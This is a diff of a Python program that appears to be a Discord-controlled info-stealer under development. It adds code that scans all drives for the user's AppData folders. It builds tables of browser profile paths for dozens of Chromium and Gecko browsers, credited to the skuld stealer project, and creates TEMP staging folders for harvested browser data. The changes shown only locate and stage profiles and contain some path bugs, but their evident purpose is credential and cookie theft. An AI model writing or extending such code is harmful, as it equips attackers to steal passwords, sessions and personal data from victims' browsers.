@@ -1,5 +1,7 @@
 import os, tempfile
 TEMP = tempfile.gettempdir()
+APPDATA = os.getenv('LOCALAPPDATA')
+ROAMING = os.getenv('APPDATA')
 try:
     import requests
     import subprocess
@@ -107,10 +109,31 @@ class utils:
     def search_disks_for_folder(folder_name: str) -> str:
         for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']:
             folder_path = os.path.join(drive, folder_name)
+            
             if os.path.exists(folder_path):
                 return folder_path
         
         return None
+    
+    def find_localappdata():
+        drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
+        localappdata_paths = []
+
+        for drive in drives:
+            potential_path = os.path.join(drive, 'Users', os.getlogin(), 'AppData', 'Local')
+            if os.path.exists(potential_path):
+                localappdata_paths.append(potential_path)
+        return localappdata_paths
+    
+    def find_roamingappdata():
+        drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
+        roamingappdata_paths = []
+
+        for drive in drives:
+            potential_path = os.path.join(drive, 'Users', os.getlogin(), 'AppData', 'Roaming')
+            if os.path.exists(potential_path):
+                roamingappdata_paths.append(potential_path)
+        return roamingappdata_paths
     
     def get_string(length: int) -> str:
         characters = string.ascii_letters + string.digits
@@ -316,64 +339,100 @@ class getinfo:
             return parts
         
     def chromium():
-        # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go
+        # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
         paths = {
-            "Chromium":             "AppData\\Local\\Chromium\\User Data",
-            "Thorium":              "AppData\\Local\\Thorium\\User Data",
-            "Chrome":               "AppData\\Local\\Google\\Chrome\\User Data",
-            "Chrome (x86)":         "AppData\\Local\\Google(x86)\\Chrome\\User Data",
-            "Chrome SxS":           "AppData\\Local\\Google\\Chrome SxS\\User Data",
-            "Maple":                "AppData\\Local\\MapleStudio\\ChromePlus\\User Data",
-            "Iridium":              "AppData\\Local\\Iridium\\User Data",
-            "7Star":                "AppData\\Local\\7Star\\7Star\\User Data",
-            "CentBrowser":          "AppData\\Local\\CentBrowser\\User Data",
-            "Chedot":               "AppData\\Local\\Chedot\\User Data",
-            "Vivaldi":              "AppData\\Local\\Vivaldi\\User Data",
-            "Kometa":               "AppData\\Local\\Kometa\\User Data",
-            "Elements":             "AppData\\Local\\Elements Browser\\User Data",
-            "Epic Privacy Browser": "AppData\\Local\\Epic Privacy Browser\\User Data",
-            "Uran":                 "AppData\\Local\\uCozMedia\\Uran\\User Data",
-            "Fenrir":               "AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
-            "Catalina":             "AppData\\Local\\CatalinaGroup\\Citrio\\User Data",
-            "Coowon":               "AppData\\Local\\Coowon\\Coowon\\User Data",
-            "Liebao":               "AppData\\Local\\liebao\\User Data",
-            "QIP Surf":             "AppData\\Local\\QIP Surf\\User Data",
-            "Orbitum":              "AppData\\Local\\Orbitum\\User Data",
-            "Dragon":               "AppData\\Local\\Comodo\\Dragon\\User Data",
-            "360Browser":           "AppData\\Local\\360Browser\\Browser\\User Data",
-            "Maxthon":              "AppData\\Local\\Maxthon3\\User Data",
-            "K-Melon":              "AppData\\Local\\K-Melon\\User Data",
-            "CocCoc":               "AppData\\Local\\CocCoc\\Browser\\User Data",
-            "Brave":                "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
-            "Amigo":                "AppData\\Local\\Amigo\\User Data",
-            "Torch":                "AppData\\Local\\Torch\\User Data",
-            "Sputnik":              "AppData\\Local\\Sputnik\\Sputnik\\User Data",
-            "Edge":                 "AppData\\Local\\Microsoft\\Edge\\User Data",
-            "DCBrowser":            "AppData\\Local\\DCBrowser\\User Data",
-            "Yandex":               "AppData\\Local\\Yandex\\YandexBrowser\\User Data",
-            "UR Browser":           "AppData\\Local\\UR Browser\\User Data",
-            "Slimjet":              "AppData\\Local\\Slimjet\\User Data",
-            "Opera":                "AppData\\Roaming\\Opera Software\\Opera Stable",
-            "OperaGX":              "AppData\\Roaming\\Opera Software\\Opera GX Stable",
+            "Chromium":             "Chromium\\User Data",
+            "Thorium":              "Thorium\\User Data",
+            "Chrome":               "Google\\Chrome\\User Data",
+            "Chrome (x86)":         "Google(x86)\\Chrome\\User Data",
+            "Chrome SxS":           "Google\\Chrome SxS\\User Data",
+            "Maple":                "MapleStudio\\ChromePlus\\User Data",
+            "Iridium":              "Iridium\\User Data",
+            "7Star":                "7Star\\7Star\\User Data",
+            "CentBrowser":          "CentBrowser\\User Data",
+            "Chedot":               "Chedot\\User Data",
+            "Vivaldi":              "Vivaldi\\User Data",
+            "Kometa":               "Kometa\\User Data",    
+            "Elements":             "Elements Browser\\User Data",
+            "Epic Privacy Browser": "Epic Privacy Browser\\User Data",
+            "Uran":                 "uCozMedia\\Uran\\User Data",
+            "Fenrir":               "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
+            "Catalina":             "CatalinaGroup\\Citrio\\User Data",
+            "Coowon":               "Coowon\\Coowon\\User Data",
+            "Liebao":               "liebao\\User Data",
+            "QIP Surf":             "QIP Surf\\User Data",
+            "Orbitum":              "Orbitum\\User Data",
+            "Dragon":               "Comodo\\Dragon\\User Data",
+            "360Browser":           "360Browser\\Browser\\User Data",
+            "Maxthon":              "Maxthon3\\User Data",
+            "K-Melon":              "K-Melon\\User Data",
+            "CocCoc":               "CocCoc\\Browser\\User Data",
+            "Brave":                "BraveSoftware\\Brave-Browser\\User Data",
+            "Amigo":                "Amigo\\User Data",
+            "Torch":                "Torch\\User Data",
+            "Sputnik":              "Sputnik\\Sputnik\\User Data",
+            "Edge":                 "Microsoft\\Edge\\User Data",
+            "DCBrowser":            "DCBrowser\\User Data",
+            "Yandex":               "Yandex\\YandexBrowser\\User Data",
+            "UR Browser":           "UR Browser\\User Data",
+            "Slimjet":              "Slimjet\\User Data",
+            "Opera":                "Opera Software\\Opera Stable",
+            "OperaGX":              "Opera Software\\Opera GX Stable",
         }
+
+        all_valid_paths = []
+        localappdatapaths = utils.find_localappdata()
+
+        for localappdatapath in localappdatapaths:
+            for name, browser_path in paths.items():
+                path = os.path.join(localappdatapath, browser_path)
+                validpath = utils.search_disks_for_folder(path)
+                if validpath != None:
+                    all_valid_paths.append((name, validpath))   
+
+        mainfolder = os.path.join(TEMP, 'chromium_browsers')
+        os.makedirs(mainfolder, exist_ok=True)
+
+        for name, browser_path in all_valid_paths:
+            os.makedirs(os.path.join(mainfolder, name), exist_ok=True)
 
 
     def gecko():
-        # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go
+        # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
         paths = {
-            "Firefox":     "AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
-            "SeaMonkey":   "AppData\\Roaming\\Mozilla\\SeaMonkey\\Profiles",
-            "Waterfox":    "AppData\\Roaming\\Waterfox\\Profiles",
-            "K-Meleon":    "AppData\\Roaming\\K-Meleon\\Profiles",
-            "Thunderbird": "AppData\\Roaming\\Thunderbird\\Profiles",
-            "IceDragon":   "AppData\\Roaming\\Comodo\\IceDragon\\Profiles",
-            "Cyberfox":    "AppData\\Roaming\\8pecxstudios\\Cyberfox\\Profiles",
-            "BlackHaw":    "AppData\\Roaming\\NETGATE Technologies\\BlackHaw\\Profiles",
-            "Pale Moon":   "AppData\\Roaming\\Moonchild Productions\\Pale Moon\\Profiles",
-            "Mercury":     "AppData\\Roaming\\mercury\\Profiles",
+            "Firefox":     "Mozilla\\Firefox\\Profiles",
+            "SeaMonkey":   "Mozilla\\SeaMonkey\\Profiles",
+            "Waterfox":    "Waterfox\\Profiles",
+            "K-Meleon":    "K-Meleon\\Profiles",
+            "Thunderbird": "Thunderbird\\Profiles",
+            "IceDragon":   "Comodo\\IceDragon\\Profiles",
+            "Cyberfox":    "8pecxstudios\\Cyberfox\\Profiles",
+            "BlackHaw":    "NETGATE Technologies\\BlackHaw\\Profiles",
+            "Pale Moon":   "Moonchild Productions\\Pale Moon\\Profiles",
+            "Mercury":     "mercury\\Profiles",
+            "Librewolf":   "librewolf\\Profiles",
         }
 
+        os.makedirs(os.path.join(TEMP, 'gecko_browsers'), exist_ok=True)
+
+        all_valid_paths = []
+        localappdatapaths = utils.find_localappdata()
+
+        for localappdatapath in localappdatapaths:
+            for name, browser_path in paths.items():
+                path = os.path.join(localappdatapath, browser_path)
+                validpath = utils.search_disks_for_folder(path)
+                if validpath != None:
+                    all_valid_paths.append((name, validpath))   
+
+        mainfolder = os.path.join(TEMP, 'gecko_browsers')
+        os.makedirs(mainfolder, exist_ok=True)
+
+        for name, browser_path in all_valid_paths:
+            os.makedirs(os.path.join(mainfolder, name), exist_ok=True)
     
+getinfo.gecko()
+input('do')
 
 client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
 
